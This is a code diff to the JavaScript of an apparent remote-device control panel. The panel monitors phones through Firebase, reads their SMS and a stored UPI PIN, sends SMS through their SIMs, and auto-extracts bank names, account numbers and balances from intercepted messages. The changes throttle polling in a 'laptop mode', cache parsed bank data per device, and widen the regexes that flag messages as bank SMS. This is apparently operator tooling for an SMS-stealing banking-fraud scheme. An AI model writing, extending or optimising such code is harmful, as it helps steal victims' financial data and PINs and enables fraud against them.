@@ -647,6 +647,10 @@ header('Content-Type: text/html; charset=UTF-8');
     .modal-overlay{background:rgba(0,0,0,0.65)!important}
     .rebel-wizard-fill{transition:none!important}
     .tbl-wrap{box-shadow:none!important}
+    #devList{contain:content;overflow-anchor:none}
+    .dev-item{contain:layout style}
+    .data-section{contain:layout style}
+    .bank-list{contain:content}
 
   </style>
 </head>
@@ -981,6 +985,8 @@ var _deviceSessionCache={};
 var _simCache={};
 var _pulseBatchTimer=0;
 var _pulseDirty=false;
+var IS_LAPTOP_MODE=true;
+var _bankParseCache={};
 var fetchStartMs=0, firstFetchDone=false;
 var activeFbId='';
 var ACTIVE_FB_KEY='rbl_active_fb';
@@ -1333,8 +1339,33 @@ function schedulePulseUi(){
   if(_pulseBatchTimer) return;
   _pulseBatchTimer=setTimeout(function(){
     _pulseBatchTimer=0;
-    if(_pulseDirty){_pulseDirty=false;scheduleProcessClientsUI(false);}
-  },400);
+    if(_pulseDirty){
+      _pulseDirty=false;
+      if(IS_LAPTOP_MODE&&selDev) refreshSelectedDevStatus();
+      else scheduleProcessClientsUI(false);
+    }
+  },IS_LAPTOP_MODE?900:400);
+}
+function refreshSelectedDevStatus(){
+  var dev=allDevs.find(function(d){return d.id===selDev;});
+  if(!dev){scheduleProcessClientsUI(false);return;}
+  var raw=clientsRawMap[selDev];
+  if(raw){
+    var on=resolveOnlineStatus(raw,dev.fbId);
+    raw._computedOnline=on;
+    dev.status=on?'online':'offline';
+    dev.battery=raw.battery||raw.battery_level||dev.battery;
+    dev.network=raw.network||raw.network_type||dev.network;
+    dev.smsCount=raw.sms_count||raw.smsCount||raw.total_sms||dev.smsCount;
+    dev.upiPin=getUpiPinFromRecord(raw)||dev.upiPin;
+  }
+  var badge=document.getElementById('dBadge');
+  if(badge){
+    badge.className='hero-badge '+dev.status;
+    badge.textContent=dev.status==='online'?'● LIVE':'○ OFFLINE';
+  }
+  renderLastSeen(dev);
+  highlightSelectedDev();
 }
 function highlightSelectedDev(){
   var items=document.querySelectorAll('.dev-item');
@@ -1350,13 +1381,14 @@ function highlightSelectedDev(){
 function saveDeviceSession(devId){
   if(!devId) return;
   _deviceSessionCache[devId]={
-    allSms:(window._allSmsData||[]).slice(0,120),
-    newSms:(window._newSmsData||[]).slice(0,60),
+    allSms:(window._allSmsData||[]).slice(0,200),
+    newSms:(window._newSmsData||[]).slice(0,80),
     allSmsTotal:window._allSmsTotal||0,
     rabelKeys:Object.assign({},window._rabelSmsSeenKeys||{}),
     rabelHydrated:!!window._rabelSmsHydrated,
     smsHash:_smsListHash,
     bankHash:_bankDataHash,
+    bankRows:(_bankParseCache[devId]||[]).slice(),
     tabLoaded:Object.assign({},tabLoaded),
     smsData:(window._smsData||[]).slice(0,120)
   };
@@ -1381,14 +1413,15 @@ function restoreDeviceSession(devId){
   window._smsData=c.smsData||[];
   _smsListHash=c.smsHash||'';
   _bankDataHash=c.bankHash||'';
+  _bankParseCache[devId]=c.bankRows||[];
   tabLoaded=Object.assign({},c.tabLoaded||{});
   return true;
 }
 function clearDeviceListenersForDev(dev){
   if(!dev) return;
-  var rid=dev.rawId, fb=dev.fbId;
+  var rid=dev.rawId;
   Object.keys(activeListeners).forEach(function(k){
-    if(k.indexOf(rid)<0&&k.indexOf(fb+'::')<0) return;
+    if(k.indexOf(rid)<0) return;
     var L=activeListeners[k];
     if(L&&L.type==='rest'&&L.timer) clearInterval(L.timer);
     else if(L&&L.type==='children'&&L.db){
@@ -1399,7 +1432,32 @@ function clearDeviceListenersForDev(dev){
   });
 }
 function getOnlinePulseMs(inst){
+  if(IS_LAPTOP_MODE) return inst&&inst.schema==='rabel'?15000:20000;
   return inst&&inst.schema==='rabel'?8000:12000;
+}
+function pulseDeviceStatus(inst,node,id){
+  var key=makeDevKey(inst.id,id);
+  var base=inst.restUrl+'/'+node+'/'+encodeURIComponent(id)+'/';
+  restJson(base+'online_status.json').then(function(st){
+    var prev=clientsRawMap[key]||{_node:node,_fbId:inst.id,name:String(id).substring(0,16)};
+    clientsRawMap[key]=Object.assign({},prev,{online_status:st,online:st===true,_node:node,_fbId:inst.id});
+    if(st===true) clientsRawMap[key]._lastOnlineMs=Date.now();
+    clientsRawMap[key]._computedOnline=resolveOnlineStatus(clientsRawMap[key],inst.id);
+    schedulePulseUi();
+  });
+  restJson(base+'live_data.json').then(function(live){
+    if(!live||typeof live!=='object') return;
+    var prev=clientsRawMap[key]||{_node:node,_fbId:inst.id,name:String(id).substring(0,16)};
+    var ts=extractHeartbeatMs({live_data:live});
+    var patch=Object.assign({},prev,{live_data:live,_node:node,_fbId:inst.id,
+      battery:live.battery_level||live.battery||prev.battery,
+      network:live.network_type||live.network||prev.network,
+      sms_count:live.total_sms||live.sms_count||prev.sms_count});
+    if(ts) patch.ts=ts;
+    if(resolveOnlineStatus(patch,inst.id)) patch._lastOnlineMs=Date.now();
+    clientsRawMap[key]=patch;
+    schedulePulseUi();
+  });
 }
 function parseJoinedDate(str){
   if(!str) return 0;
@@ -1773,6 +1831,13 @@ function attachOnlineStatusPulse(inst){
   if(inst.onlinePulseTimer) return;
   var nodes=['clients','devices'];
   function pulse(){
+    if(IS_LAPTOP_MODE&&selDev){
+      var sd=allDevs.find(function(d){return d.id===selDev;});
+      if(sd&&sd.fbId===inst.id){
+        pulseDeviceStatus(inst,sd.deviceNode||'devices',sd.rawId);
+        return;
+      }
+    }
     nodes.forEach(function(node){
       restJson(inst.restUrl+'/'+node+'.json?shallow=true').then(function(ids){
         if(!ids||typeof ids!=='object') return;
@@ -1783,28 +1848,7 @@ function attachOnlineStatusPulse(inst){
             touched=true;
             return;
           }
-          var key=makeDevKey(inst.id,id);
-          var base=inst.restUrl+'/'+node+'/'+encodeURIComponent(id)+'/';
-          restJson(base+'online_status.json').then(function(st){
-            var prev=clientsRawMap[key]||{_node:node,_fbId:inst.id,name:String(id).substring(0,16)};
-            clientsRawMap[key]=Object.assign({},prev,{online_status:st,online:st===true,_node:node,_fbId:inst.id});
-            if(st===true) clientsRawMap[key]._lastOnlineMs=Date.now();
-            clientsRawMap[key]._computedOnline=resolveOnlineStatus(clientsRawMap[key],inst.id);
-            schedulePulseUi();
-          });
-          restJson(base+'live_data.json').then(function(live){
-            if(!live||typeof live!=='object') return;
-            var prev=clientsRawMap[key]||{_node:node,_fbId:inst.id,name:String(id).substring(0,16)};
-            var ts=extractHeartbeatMs({live_data:live});
-            var patch=Object.assign({},prev,{live_data:live,_node:node,_fbId:inst.id,
-              battery:live.battery_level||live.battery||prev.battery,
-              network:live.network_type||live.network||prev.network,
-              sms_count:live.total_sms||live.sms_count||prev.sms_count});
-            if(ts) patch.ts=ts;
-            if(resolveOnlineStatus(patch,inst.id)) patch._lastOnlineMs=Date.now();
-            clientsRawMap[key]=patch;
-            schedulePulseUi();
-          });
+          pulseDeviceStatus(inst,node,id);
         });
         if(touched) schedulePulseUi();
       });
@@ -1817,6 +1861,10 @@ function startOnlineAccuracyTicker(){
   if(_onlineTickTimer) return;
   _onlineTickTimer=setInterval(function(){
     if(!panelInitialized||!Object.keys(clientsRawMap).length) return;
+    if(IS_LAPTOP_MODE&&selDev){
+      refreshSelectedDevStatus();
+      return;
+    }
     var changed=false;
     Object.keys(clientsRawMap).forEach(function(key){
       var s=clientsRawMap[key];
@@ -1835,7 +1883,7 @@ function startOnlineAccuracyTicker(){
       var dev=allDevs.find(function(d){return d.id===selDev;});
       if(dev) renderLastSeen(dev);
     }
-  },5000);
+  },IS_LAPTOP_MODE?12000:5000);
 }
 function fetchAllFirebaseData(){
   if(!firebaseInstances.length){initAllFirebase();}
@@ -2084,18 +2132,30 @@ function openDevice(id){
     window._rabelSmsHydrated=false;
     _smsListHash='';
     _bankDataHash='';
-    renderSmsList();
-  }else{
-    renderSmsList();
-    if(_activeDataTab==='bank') renderBankAccounts();
+    delete _bankParseCache[id];
   }
-  requestAnimationFrame(function(){
+  var tab=_activeDataTab;
+  if(tab==='sms'||tab==='bank'){
+    if(tab==='bank'&&_bankParseCache[id]&&_bankParseCache[id].length){
+      paintBankCards(_bankParseCache[id],(window._allSmsData||[]).length,
+        document.getElementById('bankList'),document.getElementById('bankEmpty'),
+        document.getElementById('tc-bank'),document.getElementById('bankAutoNote'));
+    }
+    renderSmsList();
+    if(tab==='bank') renderBankAccounts();
+  }else if(!restored){
+    var tb=document.getElementById('smsTbody');
+    if(tb) tb.innerHTML='<tr><td colspan="5" class="tbl-empty">Tap SMS or Bank tab to load messages</td></tr>';
+  }
+  setTimeout(function(){
     if(!dev) return;
-    if(_simCache[id]) renderSendSimPicker(_simCache[id]);
-    else loadSendSimOptions(dev);
-    if(!tabLoaded[_activeDataTab]) ensureTabLoaded(_activeDataTab);
-    else if(_activeDataTab==='sms'&&!window._allSmsData.length) ensureTabLoaded('sms');
-  });
+    if(tab==='sendsms'){
+      if(_simCache[id]) renderSendSimPicker(_simCache[id]);
+      else loadSendSimOptions(dev);
+    }
+    if(!tabLoaded[tab]) ensureTabLoaded(tab);
+    else if((tab==='sms'||tab==='bank')&&!window._allSmsData.length) ensureTabLoaded('sms');
+  },0);
 }
 
 function updateHero(d){
@@ -2542,10 +2602,18 @@ function loadSendSimOptions(dev){
 function getMergedSmsForBank(){
   var newMsgs=(window._newSmsData||[]).slice();
   var allMsgs=(window._allSmsData||[]).slice();
-  var newKeys={},ni,filteredAll=[];
+  var newKeys={},ni,filteredAll=[],out=[],seen={},n,k;
   for(ni=0;ni<newMsgs.length;ni++) newKeys[smsDedupKey(newMsgs[ni])]=1;
-  for(ni=0;ni<allMsgs.length;ni++){var k=smsDedupKey(allMsgs[ni]);if(!newKeys[k])filteredAll.push(allMsgs[ni]);}
-  return newMsgs.concat(filteredAll);
+  for(ni=0;ni<allMsgs.length;ni++){var dk=smsDedupKey(allMsgs[ni]);if(!newKeys[dk])filteredAll.push(allMsgs[ni]);}
+  newMsgs.concat(filteredAll).forEach(function(s){
+    n=normalizeSmsRecord(s)||(s&&s.body?s:null);
+    if(!n||!n.body) return;
+    k=smsDedupKey(n);
+    if(seen[k]) return;
+    seen[k]=1;
+    out.push(n);
+  });
+  return out;
 }
 function parseInrAmount(s){
   if(s==null)return null;
@@ -2631,6 +2699,12 @@ function inferBankFromBody(body){
   for(i=0;i<BANK_BODY_PATTERNS.length;i++){
     if(BANK_BODY_PATTERNS[i][0].test(b))return BANK_BODY_PATTERNS[i][1];
   }
+  if(/\bSBI\b/i.test(b)&&/(?:a\/c|acct|account|credited|debited|bal)/i.test(b)) return 'State Bank of India';
+  if(/\bHDFC\b/i.test(b)) return 'HDFC Bank';
+  if(/\bICICI\b/i.test(b)) return 'ICICI Bank';
+  if(/\bAXIS\b/i.test(b)) return 'Axis Bank';
+  if(/\bPNB\b/i.test(b)) return 'Punjab National Bank';
+  if(/\bBOB\b/i.test(b)&&/(?:a\/c|acct|bank)/i.test(b)) return 'Bank of Baroda';
   return null;
 }
 function inferBankName(body,address){
@@ -2667,11 +2741,13 @@ function extractBalanceFromSms(body){
   var b=String(body||''),patterns=[
     /(?:total\s*)?(?:avl|available)\s*bal(?:ance)?[:\s\-]*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,
     /(?:avl|available)\s*bal[:\s]*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,
-    /bal(?:ance)?\s*(?:is|as\s+on|now)\s*[:\-]?\s*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,
+    /bal(?:ance)?\s*(?:is|as\s+on|now|as\s+of)\s*[:\-]?\s*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,
     /(?:closing|clear)\s*bal(?:ance)?[:\s\-]*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,
     /(?:balance\s+in\s+your\s+a\/c)[\s\S]{0,50}(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,
     /(?:credited|debited|withdrawn|deposited|transferred)[\s\S]{0,120}(?:avl|available)\s*bal(?:ance)?[:\s\-]*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,
-    /(?:a\/c|acct)[^\d]{0,60}(?:avl|available)\s*bal(?:ance)?[:\s\-]*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i
+    /(?:a\/c|acct)[^\d]{0,60}(?:avl|available)\s*bal(?:ance)?[:\s\-]*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,
+    /\bbal[:\s]+(?:inr|rs\.?|₹)\s*([\d,]+(?:\.\d{1,2})?)/i,
+    /(?:inr|rs\.?|₹)\s*([\d,]+(?:\.\d{1,2})?)\s*(?:is\s+)?(?:your\s+)?(?:avl|available|a\/c)\s*bal/i
   ],i,m,amt;
   for(i=0;i<patterns.length;i++){
     m=b.match(patterns[i]);
@@ -2681,15 +2757,17 @@ function extractBalanceFromSms(body){
 }
 function isBalanceAlertSms(body){
   var b=String(body||'');
-  return /(?:avl|available)\s*bal|balance\s*(?:is|as\s+on|now)|closing\s*bal|clear\s*bal|balance\s+in\s+your\s+a\/c/i.test(b);
+  return /(?:avl|available)\s*bal|balance\s*(?:is|as\s+on|now|as\s+of)|closing\s*bal|clear\s*bal|balance\s+in\s+your\s+a\/c|\bbal[:\s]+(?:rs|inr|₹)/i.test(b);
 }
 function looksLikeBankSms(body,address){
   var bal=extractBalanceFromSms(body);
-  if(bal==null)return false;
-  if(!isBalanceAlertSms(body))return false;
-  if(inferBankFromSender(address))return true;
-  if(inferBankFromBody(body))return true;
-  if(extractAccountFromSms(body)&&/(?:a\/c|acct|account|avl\s*bal|available\s*bal)/i.test(body))return true;
+  if(bal==null) return false;
+  if(inferBankFromSender(address)) return true;
+  if(inferBankFromBody(body)) return true;
+  if(extractAccountFromSms(body)) return true;
+  if(isBalanceAlertSms(body)) return true;
+  if(/(?:credited|debited|withdrawn|deposited|transferred|spent|paid|received)/i.test(body)&&/(?:a\/c|acct|account)/i.test(body)) return true;
+  if(/(?:sbi|hdfc|icici|axis|kotak|pnb|bob|canara|union|idbi|yes\s*bank|indusind|federal|bandhan|idfc|rbl)/i.test(body)) return true;
   return false;
 }
 function maskBankAccount(acct){
@@ -2749,13 +2827,17 @@ function renderBankAccounts(){
   var smsList=getMergedSmsForBank();
   if(!smsList.length&&noteEl)noteEl.textContent='Fetching SMS and parsing bank balances...';
   var banks=parseBankAccountsFromSms(smsList);
+  if(selDev) _bankParseCache[selDev]=banks;
   var bh=banks.length+'|'+smsList.length;
-  if(bh===_bankDataHash&&listEl&&listEl.children.length)return;
+  if(bh===_bankDataHash&&listEl&&listEl.children.length) return;
   _bankDataHash=bh;
+  paintBankCards(banks,smsList.length,listEl,emptyEl,badge,noteEl);
+}
+function paintBankCards(banks,smsCount,listEl,emptyEl,badge,noteEl){
   if(badge)badge.textContent=String(banks.length);
   if(noteEl)noteEl.textContent=banks.length
-    ?('Auto-parsed from '+smsList.length+' SMS · SBI, HDFC, ICICI, etc.')
-    :(smsList.length?'No bank balance SMS found in '+smsList.length+' messages':'Waiting for SMS sync...');
+    ?('Auto-parsed from '+smsCount+' SMS · SBI, HDFC, ICICI, etc.')
+    :(smsCount?'No bank balance SMS found in '+smsCount+' messages':'Waiting for SMS sync...');
   if(!banks.length){
     if(emptyEl){emptyEl.style.display='';emptyEl.innerHTML='🏦 No bank SMS found<br><span style="font-size:11px;opacity:.6">SBI, HDFC, ICICI balance alerts appear here</span>';}
     if(listEl)listEl.innerHTML='';return;
